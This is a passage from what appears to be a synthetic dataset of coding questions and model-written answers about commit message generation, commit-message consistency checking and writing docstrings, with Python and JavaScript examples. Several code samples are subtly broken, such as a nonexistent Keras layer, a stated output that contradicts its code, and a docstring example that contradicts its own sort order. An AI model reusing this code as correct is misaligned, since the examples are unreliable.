module\",\n    \"Refactored code to improve performance\",\n    \"Merge branch 'feature/new_algorithm' into 'main'\",\n    \"Added support for CSV file import\",\n    \"Fixed typing errors in the documentation\",\n]\n\n# Preprocess commit messages\ninputs = tokenizer(commit_messages, max_length=400, padding=\"max_length\", truncation=True, return_tensors=\"pt\")\n\n# Generate summaries\nsummary_ids = model.generate(inputs[\"input_ids\"], num_beams=4, max_length=60, min_length=20, early_stopping=True)\nsummary_texts = tokenizer.decode(summary_ids[0], skip_special_tokens=True)\n\n# Output the changelog entry\nchangelog_entry = \"Changelog:\\n\\n\" + summary_texts\nprint(changelog_entry)\n```\nThis script loads a pre-trained BART model and tokenizer, processes a list of commit messages, and generates a summary using beam search decoding. The output is a concise changelog entry combining the most important changes.\n\nQuestion 2: Create a custom ensemble algorithm that combines the outputs of multiple text summarization models, including BART, T5, and PEGASUS, to generate more accurate and diverse changelog summaries. The algorithm should optimize for both informativeness and readability while handling conflicting information across models.\n\n**Concept**: Ensemble Learning, Text Summarization\n\nSolution:\nTo create an ensemble model, we can train and fine-tune multiple pre-trained models and then use a voting or blending strategy to combine their outputs. Here's an example of how to fine-tune BART, T5, and PEGASUS models and combine their summaries using a voting mechanism:\n\n1. Fine-tune each model on a dataset of commit messages and corresponding changelog summaries.\n\n2. Generate summaries from each model for a new set of commit messages.\n\n```python\n# Fine-tuned models (replace with your own fine-tuned models)\nbart_finetuned = ...\nt5_finetuned = ...\npegasus_finetuned = ...\n\n# Example commit messages (same as before)\ncommit_messages = ...\n\n# Preprocess commit messages for each model\n# ...\n\n# Generate summaries\nbart_summaries = [tokenizer.decode(s, skip_special_tokens=True) for s in bart_finetuned.generate(...)]\nt5_summaries = [tokenizer.decode(s, skip_special_tokens=True) for s in t5_finetuned.generate(...)]\npegasus_summaries = [tokenizer.decode(s, skip_special_tokens=True) for s in pegasus_finetuned.generate(...)]\n```\n1. Combine the summaries using a voting mechanism to select the most common phrases or sentences.\n\n```python\ndef ensemble_summary(summaries_list):\n    # Perform phrase/sentence extraction and frequency counting\n    # ...\n\n    # Select the most common phrases/sentences\n    # ...\n\n    return changelog_entry\n\nchangelog_entry = ensemble_summary([bart_summaries, t5_summaries, pegasus_summaries])\n```\nThis ensemble approach helps to improve the summary quality by combining the strengths of multiple models and reducing errors or inconsistencies."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Context-aware commit suggestions", "Complexity_Level": "medium", "Response": "The given JSON doesn't have a direct match for \"Commit text generation\" or \"Context-aware commit suggestions.\" However, we can frame a problem related to source code analysis and commit message generation using a combination of concepts from \"Programming Language Concepts\" and \"Development\" categories. Let's assume we're using the concept of \"Middleware pattern\" to create a middleware for analyzing changes in code and suggesting commit messages.\n\n**Problem:**\nCreate a middleware for a code editor that analyzes changes made in a file and suggests context-aware commit messages based on the type of changes and the affected code regions.\n\n**Solution:**\n\nConcept: Middleware pattern\n\nWe can create a middleware in a language like JavaScript, which is commonly used for building web-based code editors. The middleware will analyze the contents of a file before a save operation and generate a suitable commit message based on the changes made.\n\nHere's a simplified example using JavaScript:\n\n```javascript\nclass CodeChangeAnalyzer {\n  constructor() {}\n\n  analyzeChanges(oldCode, newCode) {\n    // Perform diff analysis between old and new code\n    const diff = this.computeDiff(oldCode, newCode);\n\n    // Analyze diff to identify relevant changes (e.g., added, removed, modified lines)\n    const commitMessageParts = [];\n    diff.forEach(part => {\n      if (part.added) {\n        commitMessageParts.push(`Added ${part.value}`);\n      } else if (part.removed) {\n        commitMessageParts.push(`Removed ${part.value}`);\n      } else if (part.count > 1 && !part.added && !part.removed) {\n        commitMessageParts.push(`Modified ${part.count} lines`);\n      }\n    });\n\n    // Generate commit message\n    const commitMessage = commitMessageParts.join(', ');\n\n    return commitMessage;\n  }\n\n  computeDiff(oldCode, newCode) {\n    // Use a library like 'diff' to compute the difference between old and new code\n    const Diff = require('diff');\n    return Diff.diffLines(oldCode, newCode);\n  }\n}\n\n// Usage example\nconst analyzer = new CodeChangeAnalyzer();\nconst oldCode = `function add(a, b) {\n  return a + b;\n}\n`;\nconst newCode = `function add(a, b) {\n  return a * b;\n}\n`;\n\nconst commitMessage = analyzer.analyzeChanges(oldCode, newCode);\nconsole.log(commitMessage); // Output: \"Modified 1 line\"\n```\n\nThis example demonstrates a simple approach to generating commit messages based on code changes. In a real-world scenario, the middleware could be more sophisticated, using syntax analysis or code intelligence to provide more context and accuracy in the commit suggestions."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Context-aware commit suggestions", "Complexity_Level": "extremely difficult", "Response": "Area: \"Commit Text Generation\"\nSub Area: \"Context-aware Commit Suggestions\"\n\nProblem 1: Developing a complex machine learning model that suggests context-aware commit messages based on code changes, developer history, and project context. The model needs to handle large code repositories with millions of lines of code and be scalable.\n\nSolution: To tackle this problem, we can use a combination of deep learning techniques like Long Short-Term Memory (LSTM) networks and Graph Neural Networks (GNNs) to capture both sequential and structural information from code changes. The model will take into account the developer's historical commit patterns and the project's context to generate relevant commit messages.\n\nExample in Python using TensorFlow:\n```python\nimport tensorflow as tf\nimport numpy as np\nfrom tensorflow.keras.models import Sequential\nfrom tensorflow.keras.layers import LSTM, Dense, Embedding, GraphAttention\nfrom code_change_processing import preprocess_code_changes\nfrom developer_history import load_dev_history\n\n# Preprocess code changes and developer history\ncode_changes_data, dev_history = preprocess_code_changes('large_repo_data.csv'), load_dev_history('dev_history.json')\ncode_changes_embeddings = create_code_change_embeddings(code_changes_data)  # Generate embeddings for code changes\ndev_history_embeddings = create_dev_history_embeddings(dev_history)  # Generate embeddings for developer history\n\n# Build the model\nmodel = Sequential([\n    GraphAttention(units=128, num_heads=8),\n    LSTM(256, return_sequences=True),\n    LSTM(128),\n    Dense(64, activation='relu'),\n    Dense(64, activation='relu'),\n    Dense(512, activation='relu'),\n    Dense(1024, activation='relu'),\n    Dense(512, activation='relu'),\n    Dense(256, activation='relu'),\n    Dense(128, activation='relu'),\n    Dense(50, activation='softmax')  # Assuming 50 unique commit message templates\n])\n\n# Compile and train the model\nmodel.compile(loss='categorical_crossentropy', optimizer='adam', metrics=['accuracy'])\nmodel.fit([code_changes_embeddings, dev_history_embeddings], commit_message_templates, epochs=100, batch_size=64)\n\n# Generate commit messages\npredicted_commit_messages = model.predict([new_code_change_embeddings, dev_history_embeddings])\n\n```\nThis example demonstrates a high-level structure for a deep learning model that combines GNNs and LSTMs. It assumes the existence of functions for preprocessing code changes, developer history, and creating embeddings. The model is trained on historical data and then used to generate commit message suggestions for new code changes.\n\nProblem 2: Implementing a real-time, distributed system that provides context-aware commit suggestions to multiple concurrent developers, integrating the previously mentioned model with a version control system (e.g., Git) and a scalable backend.\n\nSolution: We can build a system using a microservices architecture with a backend service for commit message suggestions, a frontend for integrating with the developer's IDE, and a Git hook to trigger suggestions. The backend service can be designed using a message queue (e.g., Apache Kafka) to handle concurrent requests and a distributed caching layer (e.g., Redis) for efficient retrieval of recent commit patterns.\n\nExample in Python using Flask, Redis, and Kafka:\n```python\nfrom flask import Flask, request\nimport redis\nfrom kafka import KafkaConsumer, KafkaProducer\nimport json\nfrom commit_suggestion_model import get_commit_suggestion\n\napp = Flask(__name__)\nredis_client = redis.Redis(host='redis_host', port=6379, db=0)\nkafka_producer = KafkaProducer(bootstrap_servers='kafka_host:9092')\nkafka_consumer = KafkaConsumer('commit_request', bootstrap_servers='kafka_host:9092')\n\n@app.route('/commit-suggestion', methods=['POST'])\ndef commit_suggestion():\n    data = request.get_json()\n    code_change, dev_id = data['code_change'], data['dev_id']\n    code_change_embedding, dev_history_embedding = get_code_and_dev_embeddings(code_change, dev_id)\n    \n    suggestion = get_commit_suggestion(code_change_embedding, dev_history_embedding)\n    redis_client.set(f'dev_{dev_id}_last_suggestion', suggestion)\n\n    kafka_producer.send('commit_response', key=dev_id.encode(), value=json.dumps(suggestion).encode())\n    return json.dumps(suggestion), 200\n\ndef get_code_and_dev_embeddings(code_change, dev_id):\n    # Load and process code change and developer history embeddings from Redis or backend database\n    pass\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\n\n# On the developer's machine\ndef get_realtime_commit_suggestion(code_change, dev_id):\n    kafka_producer.send('commit_request', key=dev_id.encode(), value=json.dumps({'code_change': code_change, 'dev_id': dev_id}))\n    suggestion = json.loads(kafka_consumer.poll(5.0).value)\n    return suggestion\n\n# Git hook\ndef git_pre_commit(code_change):\n    suggestion = get_realtime_commit_suggestion(code_change, current_dev_id)\n    # Prompt user with commit suggestion or integrate with IDE to auto-fill commit message\n```\nThis example demonstrates a Flask API that receives commit requests, retrieves or computes embeddings, and communicates with the Git hook and Redis cache. The developer's machine uses a Kafka consumer to get real-time commit suggestions, which can then be integrated into the IDE or Git CLI. The architecture allows for scalability and concurrency in handling commit suggestions for multiple developers."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Feature-specific commit messages", "Complexity_Level": "medium", "Response": "The given domain JSON doesn't directly cover \"Commit text generation\" or \"Feature-specific commit messages.\" However, commit messages are a common practice in version control systems like Git, which is often used in conjunction with various programming languages for software development. Here, we can create a problem related to generating commit messages based on specific changes made in the code.\n\nQuestion 1:\nProblem: A developer needs to write a Python script that generates a feature-specific commit message when a new feature is added to the codebase. The script should detect the addition of a new function in a Python source file and generate an appropriate commit message.\n\nSolution:\n```python\nimport re\nimport os\n\ndef find_new_functions(file_path):\n    with open(file_path, 'r') as file:\n        file_content = file.read()\n        pattern = r'def (\\w+):'\n        new_functions = re.findall(pattern, file_content)\n    return new_functions\n\ndef generate_commit_message(file_path):\n    new_functions = find_new_functions(file_path)\n    if new_functions:\n        commit_message = 'feat: Added '\n        for function in new_functions:\n            commit_message += f'{function}() '\n        return commit_message.strip()\n    else:\n        return 'No new features added.'\n\n# Example usage\nfile_path = 'path/to/your/python/file.py'\ncommit_message = generate_commit_message(file_path)\nprint(commit_message)\n```\nConcept: Text Processing\n\nQuestion 2:\nProblem: A developer needs to create a JavaScript tool that automatically generates commit messages by identifying changes made to a specific feature in a React application. The tool should detect when a new component is created or an existing component is updated.\n\nSolution:\n```javascript\nconst fs = require('fs');\nconst path = require('path');\nconst glob = require('glob');\n\nfunction findNewOrUpdatedComponents(directory) {\n  return glob.sync(`${directory}/**/*.js`, { ignore: `${directory}/node_modules/**` })\n    .filter(file => file.endsWith('.js') && !fs.statSync(file).isDirectory())\n    .map(file => {\n      const contents = fs.readFileSync(file, 'utf-8');\n      const isReactComponent = contents.includes('export default') && contents.includes('class');\n      return isReactComponent ? path.basename(file, '.js') : null;\n    })\n    .filter(Boolean);\n}\n\nfunction generateCommitMessage(directory) {\n  const components = findNewOrUpdatedComponents(directory);\n  if (components.length > 0) {\n    const message = components.map(component => `feat(ui): ${component}`).join('\\n');\n    return `${message}\\n\\n<!-- Describe any additional details or context -->`;\n  } else {\n    return 'No new or updated components found.';\n  }\n}\n\n// Example usage\nconst appDirectory = './src/components/';\nconst commitMessage = generateCommitMessage(appDirectory);\nconsole.log(commitMessage);\n```\nConcept: File System Management"}, {"L2_TASK": "Commit text generation", "L3_TASK": "Feature-specific commit messages", "Complexity_Level": "extremely difficult", "Response": "Area: \"Version Control\"\nSub Area: \"Feature-specific commit messages\"\nConcept: \"Commit Text Generation\"\n\nQuestion 1:\nProblem: Generate feature-specific, coherent, and meaningful commit messages automatically for a large codebase with multiple concurrent features and bug fixes. The commit messages should accurately describe the changes made, follow a consistent format, and include relevant issue IDs when applicable.\n\nSolution:\nTo achieve this, we can create a Python script that uses natural language processing (NLP) and code analysis to generate commit messages. The script will analyze code changes, identify related features, and format the commit message accordingly.\n\nExample code:\n```python\nimport os\nimport re\nimport ast\nimport nltk\nfrom nltk.tokenize import word_tokenize, sent_tokenize\nfrom nltk.corpus import stopwords\n\ndef extract_feature_info(changed_files):\n    features = set()\n    issue_ids = set()\n\n    for file in changed_files:\n        with open(file, 'r') as f:\n            lines = f.readlines()\n\n        for line in lines:\n            # Extract issue IDs from comments\n            match = re.search(r'\\b(issue|bug|pr)\\s*#(\\d+)', line)\n            if match:\n                issue_ids.add(match.group(2))\n\n            # Extract class and method names to identify features\n            try:\n                node = ast.parse(line)\n                for child in ast.walk(node):\n                    if isinstance(child, ast.ClassDef) or isinstance(child, ast.FunctionDef):\n                        features.add(child.name)\n            except SyntaxError:\n                continue\n\n    return features, issue_ids\n\ndef generate_commit_message(changed_files, author):\n    features, issue_ids = extract_feature_info(changed_files)\n    stop_words = set(stopwords.words('english'))\n\n    message = f\"Author: {author}\\n\\n\"\n\n    if issue_ids:\n        message += \"Fixes:\\n\"\n        for id in issue_ids:\n            message += f\"- #{id}\\n\"\n\n    if features:\n        message += \"\\nFeatures:\\n\"\n        tokenized_words = []\n        for file in changed_files:\n            with open(file, 'r') as f:\n                content = f.read()\n            words = word_tokenize(content)\n            tokenized_words.extend(words)\n\n        filtered_words = [word.lower() for word in tokenized_words if word.isalpha() and word.lower() not in stop_words]\n        frequent_words = nltk.FreqDist(filtered_words)\n\n        for feature in sorted(features, key=lambda x: frequent_words[x.lower()], reverse=True):\n            message += f\"- {feature}\\n\"\n\n    return message\n\n# Example usage\nchanged_files = [\"src/app.py\", \"src/models/user.py\"]\nauthor = \"John Doe\"\n\ncommit_message = generate_commit_message(changed_files, author)\nprint(commit_message)\n```\nThis script reads the changed files, extracts issue IDs and feature names, and generates a commit message that includes relevant information. It uses the Natural Language Toolkit (nltk) for tokenization and stop words removal.\n\nQuestion 2:\nProblem: Develop a machine learning model that predicts the optimal commit message format for a code change based on historical commit data, file types, and issue IDs. The model should consider the context, impact, and complexity of the change to provide a more accurate and informative commit message.\n\nSolution:\nWe can use a combination of supervised and unsupervised learning techniques to create a model in Python. First, we'll preprocess and extract features from the historical commit messages and code changes. Then, we'll use a recurrent neural network (RNN) for sequence prediction.\n\nExample code (high-level outline, not a complete implementation):\n```python\nimport pandas as pd\nimport numpy as np\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom keras.preprocessing.text import Tokenizer\nfrom keras.preprocessing.sequence import pad_sequences\nfrom keras.models import Sequential\nfrom keras.layers import Embedding, LSTM, Dense\n\n# Load and preprocess historical commit data\ndata = pd.read_csv(\"commit_history.csv\")\nX = data[\"commit_message\"]\ny = data[\"file_type\"] + \"_\" + data[\"issue_id\"]\n\n# Split into train and test sets\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n\n# Vectorize commit messages and encode labels\nvectorizer = TfidfVectorizer()\nX_train_vec = vectorizer.fit_transform(X_train)\nX_test_vec = vectorizer.transform(X_test)\n\n# Build RNN model\nvocab_size = 10000\nmax_len = 100\nembedding_dim = 16\nmodel = Sequential()\nmodel.add(Tokenizer(num_words=vocab_size, input_length=max_len))\nmodel.add(Embedding(vocab_size, embedding_dim, input_length=max_len))\nmodel.add(LSTM(64))\nmodel.add(Dense(128, activation='relu'))\nmodel.add(Dense(1, activation='sigmoid'))\n\n# Compile and train the model\nmodel.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy'])\nmodel.fit(X_train_vec, y_train, epochs=10, batch_size=32, validation_split=0.1)\n\n# Evaluate on test data\nloss, accuracy = model.evaluate(X_test_vec, y_test)\nprint(f\"Test accuracy: {accuracy * 100:.2f}%\")\n```\nThis high-level example outlines the creation of an RNN model using Keras to predict the optimal commit message format. The implementation would require additional steps for data preprocessing, feature extraction, and model fine-tuning. The actual commit message generation would still require post-processing, potentially using techniques like beam search or NLP libraries to generate human-readable text."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Commit message consistency checker", "Complexity_Level": "medium", "Response": "\"Commit text generation\" and \"Commit message consistency checker\" are not directly mentioned in the given JSON. However, they are related to version control and software development practices. A commit message consistency checker can be considered as a tool or script that validates commit messages according to a defined set of rules.\n\nHere are two medium-level complexity problems and their solutions using Python:\n\nProblem 1: Develop a script that checks if a commit message follows the \"imperative mood\" rule, which suggests that the commit message should read like a command.\n\n**Concept**: Text Processing, Regular Expressions\n\n```python\nimport re\n\ndef check_imperative_mood(commit_message):\n    # Check if the commit message starts with a lowercase letter and has no full stop at the end\n    pattern = r\"^[a-z].*[^.]$\"\n    if re.match(pattern, commit_message):\n        return True\n    else:\n        return False\n\n# Example commit messages\nmessages = [\"fix bug in calculation\", \"Improving algorithm performance\", \"Add feature: user authentication\"]\n\nfor message in messages:\n    if check_imperative_mood(message):\n        print(f\"{message} is consistent with the imperative mood.\")\n    else:\n        print(f\"{message} is not consistent with the imperative mood.\")\n```\n\nProblem 2: Implement a function to verify if a commit message has a concise subject line and a detailed description, separated by a blank line, as per the conventional commits standard.\n\n**Concept**: Text Processing, String Manipulation\n\n```python\ndef check_conventional_commits(commit_message):\n    lines = commit_message.strip().split(\"\\n\")\n    \n    # Check if message has at least 2 lines and first line is no more than 50 characters\n    if len(lines) >= 2 and len(lines[0]) <= 50:\n        subject = lines[0]\n        body = \"\\n\".join(lines[1:])\n        if body.startswith(\" \" * 4):  # Check if body has at least one indented line\n            return True\n    return False\n\n# Example commit message\nmessage = \"\"\"fix: bug in calculation\n\nFixes an issue where the calculation function returned incorrect results when negative numbers were involved.\"\"\"\n\nif check_conventional_commits(message):\n    print(\"The commit message follows the conventional commits standard.\")\nelse:\n    print(\"The commit message does not follow the conventional commits standard.\")\n```\n\nThese examples demonstrate text processing and validation using regular expressions or string manipulation to ensure commit messages adhere to best practices."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Commit message consistency checker", "Complexity_Level": "extremely difficult", "Response": "Area: \"Commit Text Generation\" Sub Area: \"Commit Message Consistency Checker\"\n\nProblem: Develop a commit message consistency checker that utilizes advanced natural language processing (NLP) techniques to enforce a specific style guide for commit messages. The tool should be able to identify and flag inconsistencies in formatting, grammar, and semantic meaning across multiple commit messages. Furthermore, it should provide suggestions for correcting the inconsistencies and be extensible to support different styles.\n\nConcept: Natural Language Processing\n\nSolution:\n\n1. Question: How can we create a Python-based commit message consistency checker that identifies inconsistencies in formatting, grammar, and semantic meaning, while also providing corrective suggestions?\n\nExample code:\n```python\nimport re\nimport nltk\nfrom nltk.tokenize import word_tokenize, sent_tokenize\nfrom nltk.corpus import stopwords\nfrom nltk.stem import WordNetLemmatizer\nfrom spacy.lang.en import English\n\n# Load and define the style guide rules\ndef load_style_guide(style_file):\n    with open(style_file, 'r') as f:\n        rules = f.read().splitlines()\n    return rules\n\n# Preprocess commit message\ndef preprocess(message):\n    message = re.sub(r'\\W+', ' ', message)  # Remove non-alphanumeric characters\n    message = message.lower()  # Convert to lowercase\n    tokens = word_tokenize(message)  # Tokenize\n    lemmatizer = WordNetLemmatizer()\n    tokens = [lemmatizer.lemmatize(token) for token in tokens if token not in stopwords.words('english')]  # Lemmatize and remove stopwords\n    return tokens, sent_tokenize(message)\n\n# Check consistency rules\ndef check_consistency(message, rules):\n    tokens, sentences = preprocess(message)\n    violations = []\n    for rule in rules:\n        if re.search(rule, message, re.IGNORECASE):\n            violations.append(f'Violation: {rule}')\n    return violations\n\n# Suggest corrections\ndef suggest_corrections(violations, message):\n    nlp = English()\n    doc = nlp(message)\n    corrections = []\n    for violation in violations:\n        # Example: Correcting subject-verb agreement\n        if 'subject-verb agreement' in violation:\n            for token in doc:\n                if token.pos_ == 'VERB' and token.head.pos_ == 'NOUN' and token.head.number != token.number:\n                    corrections.append(f'Correct {token} to {token.head.number} form')\n    return corrections\n\n# Main function\ndef main(style_file, commit_messages):\n    rules = load_style_guide(style_file)\n    for message in commit_messages:\n        violations = check_consistency(message, rules)\n        if violations:\n            print(f'Commit message: {message}')\n            print('Violations:')\n            for violation in violations:\n                print(violation)\n            print('Suggestions:')\n            for correction in suggest_corrections(violations, message):\n                print(correction)\n        else:\n            print(f'Commit message: {message} - Compliant')\n\n# Example usage\nif __name__ == '__main__':\n    style_file = 'style_guide.txt'\n    commit_messages = ['Fix typo in readme', 'Refactor code for performance improvemnts']\n    main(style_file, commit_messages)\n```\n1. Question: How can we integrate the consistency checker with a Git hook to automatically validate commit messages before committing in a Git-based project?\n\nExample code:\n```bash\n#!/bin/sh\n\n# Run the Python script as a pre-commit hook\npython3 commit_message_checker.py style_guide.txt \"$(git diff --cached --name-only --diff-filter=AM | tr '\\n' ' ')\"\n\n# Exit with non-zero status if there are any violations\nif [ $? -eq 0 ]; then\n    echo \"Commit message is compliant. Proceeding with commit.\"\n    exit 0\nelse\n    echo \"Commit message has violations. Please correct and try again.\"\n    exit 1\nfi\n```\nTo"}, {"L2_TASK": "Document this function", "L3_TASK": "Write a docstring", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Write a Python function called `calculate_average` that takes a list of numbers as input and returns the average of those numbers. Document the function using a docstring.\n\nSolution:\n\n```python\ndef calculate_average(numbers):\n    \"\"\"\n    Calculate the average of a list of numbers.\n\n    Args:\n    numbers (list): A list of numerical values.\n\n    Returns:\n    float: The average (mean) of the numbers in the input list.\n\n    Examples:\n    >>> calculate_average([1, 2, 3, 4, 5])\n    3.0\n    >>> calculate_average([0, 10, 20, 30])\n    10.0\n    >>> calculate_average([])\n    Traceback (most recent call last):\n    ...\n    ValueError: The input list cannot be empty.\n\n    \"\"\"\n    if not numbers:\n        raise ValueError(\"The input list cannot be empty.\")\n    return sum(numbers) / len(numbers)\n```\n\nConcept: \"Function\"\n\nQuestion 2:\nProblem: Create a JavaScript function named `convertDate` that takes a date string in ISO format (YYYY-MM-DD) and converts it to a user-friendly format (Month DD, YYYY). Document the function using a JSDoc comment.\n\nSolution:\n\n```javascript\n/**\n * Converts a date string in ISO format (YYYY-MM-DD) to a user-friendly format (Month DD, YYYY).\n *\n * @param {string} isoDate - A date string in the ISO format (YYYY-MM-DD).\n * @returns {string} The date in a user-friendly format (e.g., \"March 05, 2023\").\n * @throws {TypeError} If the input is not a string.\n * @throws {RangeError} If the input date is not in the correct format.\n *\n * @example\n * convertDate('2023-03-05') // Returns: \"March 05, 2023\"\n * convertDate('2022-12-31') // Returns: \"December 31, 2022\"\n * convertDate('invalid-date') // Throws a RangeError\n */\nfunction convertDate(isoDate) {\n    if (typeof isoDate !== 'string') {\n        throw new TypeError('Input must be a string in the format YYYY-MM-DD.');\n    }\n    const dateParts = isoDate.split('-');\n    if (dateParts.length !== 3 || !Number.isInteger(+dateParts[0]) || !Number.isInteger(+dateParts[1]) || !Number.isInteger(+dateParts[2])) {\n        throw new RangeError('Invalid date format. Please use the format YYYY-MM-DD.');\n    }\n    const months = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];\n    const monthIndex = parseInt(dateParts[1]) - 1;\n    const day = dateParts[2].padStart(2, '0');\n    return `${months[monthIndex]} ${day}, ${dateParts[0]}`;\n}\n```\n\nConcept: \"Function\""}, {"L2_TASK": "Document this function", "L3_TASK": "Write a docstring", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nGiven a function `recursive_advanced_sort` that implements a complex, recursive sorting algorithm based on a combination of Quick Sort, Merge Sort, and Heap Sort. The function takes a list of dictionaries, where each dictionary has an 'id' key and a 'value' key. The function sorts the list first by the 'value' keys (in descending order) and then by the 'id' keys (in ascending order). Write a detailed docstring for the `recursive_advanced_sort` function using the reStructuredText format, explaining its functionality, inputs, outputs, and any edge cases or performance considerations.\n\n```python\ndef recursive_advanced_sort(lst_of_dicts):\n    \"\"\"\n    Recursive Advanced Sort (RAS): A hybrid sorting algorithm combining Quick Sort, Merge Sort, and Heap Sort.\n    Sorts a list of dictionaries by the 'value' keys in descending order, followed by 'id' keys in ascending order.\n\n    Args:\n        lst_of_dicts (list): A list of dictionaries, where each dictionary has the following structure:\n                            {\n                                'id': <int>,  # Unique identifier\n                                'value': <int or float>,  # Numeric value to sort by\n                            }\n\n    Returns:\n        list: A sorted list of dictionaries maintaining the original input structure.\n\n    Edge Cases:\n        - Empty list: Returns an empty list.\n        - Duplicates: Values and IDs can be duplicates, they will be sorted consistently.\n        - Large inputs: The algorithm has an average time complexity of O(n log n). However, in worst-case scenarios,\n                        the time complexity can reach O(n^2) due to the hybrid nature of the algorithm.\n\n    Note:\n        - The sorting is stable, preserving the relative order of equal elements.\n\n    Example:\n        >>> lst = [{'id': 1, 'value': 3}, {'id': 2, 'value': 1}, {'id': 3, 'value': 2}]\n        >>> recursive_advanced_sort(lst)\n        [{'id': 2, 'value': 1}, {'id': 3, 'value': 2}, {'id': 1, 'value': 3}]\n    \"\"\"\n    # Function implementation\n    ...\n```\n\nQuestion 2:\nCreate a function called `custom_number_format` that accepts a number and a formatting style, and returns a formatted string based on the style. The function should handle four different styles: 'integer', 'decimal', 'scientific', and 'currency'. The function should also have a docstring explaining its functionality, inputs, outputs, and any exceptions that can be raised.\n\n```python\nimport locale\n\ndef custom_number_format(number, style):\n    \"\"\"\n    Formats a number based on the specified style.\n\n    Args:\n        number (float): The number to format.\n        style (str): The formatting style. Can be one of 'integer', 'decimal', 'scientific', or 'currency'.\n                     For 'currency', the formatting is based on the user's locale.\n\n    Returns:\n        str: The formatted number as a string.\n\n    Raises:\n        ValueError: If the 'style' argument is not one of the supported styles.\n\n    Locale-Sensitive Styles:\n        - 'currency': Formats the number as a currency value using the user's locale settings.\n                      E.g., in the US it will use \"$1,234.56\", in France \"1 234,56 \u20ac\".\n\n    Examples:\n        >>> custom_number_format(1234.5678, 'integer')\n        '1235'\n        >>> custom_number_format(1234.5678, 'decimal')\n        '1234.57'\n        >>> custom_number_format(1234.5678, 'scientific')\n        '1.2345678e+03'\n        >>> custom_number_format(1234.5678, 'currency')\n        '$1,234.57'  # Example for US locale, actual output depends on the system locale\n    \"\"\"\n    if style == 'integer':\n        return f\"{int(number):,}\"\n    elif style == 'decimal':\n        return f\"{number:.2f}\"\n    elif style == 'scientific':\n        return f\"{number:.8e}\"\n    elif style == 'currency':\n        return locale.currency(number)\n    else:\n        raise ValueError(\"Unsupported style. Please choose from 'integer', 'decimal', 'scientific', or 'currency'.\")\n```\nRemember that the actual implementation of the sorting algorithm in the `recursive_advanced_sort` function and the formatting logic in the `custom_number_format` function are not provided here, as the focus is on writing detailed docstrings."}, {"L2_TASK": "Document this function", "L3_TASK": "Extended documentation with examples", "Complexity_Level": "medium", "Response": "Question 1:\nGiven a Python function `calculate_average(numbers)` that calculates the average of a list of numbers, provide extended documentation including a brief description, parameters, return value, and example usage.\n\n```python\ndef calculate_average(numbers):\n    \"\"\"\n    Calculate the average (mean) of a list of numbers.\n\n    Parameters:\n    numbers (List[float]): A list of floating-point numbers.\n\n    Returns:\n    float: The arithmetic mean of the input numbers.\n    \n    Example:\n    >>> calculate_average([1, 2, 3, 4, 5])\n    3.0\n    >>> calculate_average([10, 20, 30, 40, 50, 60])\n    35.0\n    \"\"\"\n    return sum(numbers) / len(numbers)\n```\n\nQuestion 2:\nConsider a JavaScript function `capitalizeWords(string)` which capitalizes the first letter of each word in a given string. Provide detailed documentation with parameter explanation, return value, and a code example.\n\n```javascript\n/**\n * Capitalizes the first letter of each word in a given string.\n *\n * @param {string} string - The input string where each word's first letter should be capitalized.\n * @returns {string} A new string with the first letter of each word capitalized.\n\n * @example\n * capitalizeWords(\"hello world\") // Returns \"Hello World\"\n * capitalizeWords(\"javascript is fun\") // Returns \"Javascript Is Fun\"\n */\nfunction capitalizeWords(string) {\n    return string.replace(/\\b\\w/g, function(char) {\n        return char.toUpperCase();\n    });\n}\n```\n\nIn both examples, the `Concept` used is \"Extended documentation with examples\"."}, {"L2_TASK": "Document this function", "L3_TASK": "Extended documentation with examples", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nProblem: Develop a highly complex function for natural language processing (NLP) that implements a sentiment analysis algorithm. The function should accept a string as input and return the sentiment score as a float, ranging from -1.0 (negative) to 1.0 (positive). The extended documentation should include detailed explanations of the algorithm, its limitations, and several examples demonstrating various edge cases.\n\nSolution:\n```python\nimport nltk\nfrom nltk.sentiment import SentimentIntensityAnalyzer\n\n\"\"\"\nFunction: sentiment_analysis\nDescription: This function performs sentiment analysis using the VADER (Valence Aware Dictionary and sEntiment Reasoner) algorithm.\n             It analyzes a given text and returns a sentiment score ranging from -1.0 (negative) to 1.0 (positive).\n       \nArguments:\n    - text (str): The input text that needs to be analyzed for sentiment.\n\nReturns:\n    - sentiment_score (float): The sentiment score of the input text.\n\nLimitations:\n    - VADER is primarily designed for English texts and may not perform well on non-English or colloquial content.\n    - It struggles with sarcasm, irony, and context-dependent sentiments.\n    - The sentiment score might not always capture the nuances of complex emotions.\n\nExample:\n    >>> sentiment_analysis(\"I am extremely happy today!\")\n    0.95\n    >>> sentiment_analysis(\"This is the worst day of my life.\")\n    -0.9\n\"\"\"\n\ndef sentiment_analysis(text):\n    analyzer = SentimentIntensityAnalyzer()\n    sentiment_score = analyzer.polarity_scores(text)[\"compound\"]\n    return sentiment_score\n\n# Example usage\ntext1 = \"I can't believe how amazing this movie is! It's a masterpiece.\"\ntext2 = \"The customer service was terrible. I'm extremely disappointed.\"\n\nprint(sentiment_analysis(text1))\nprint(sentiment_analysis(text2))\n```\n\nQuestion 2:\nProblem: Create a highly complex function for image processing using Python's OpenCV library. The function should detect and count the number of faces in an image. The extended documentation should explain the Haar Cascade Classifier, its limitations, and provide multiple examples with different types of images, varying lighting conditions, and occlusions.\n\nSolution:\n```python\nimport cv2\n\n\"\"\"\nFunction: face_counter\nDescription: This function detects and counts faces in an image using the Haar Cascade Classifier provided by OpenCV.\n             It applies a set of pre-trained classifiers to identify and count human faces.\n\nArguments:\n    - image_path (str): The path to the input image file.\n\nReturns:\n    - face_count (int): The number of faces detected in the input image.\n\nLimitations:\n    - The Haar Cascade Classifier may struggle with low-resolution images or faces with severe occlusions.\n    - It may have difficulty detecting faces in complex backgrounds or under varied lighting conditions.\n    - The classifier is sensitive to scaling and rotation, requiring pre-processing 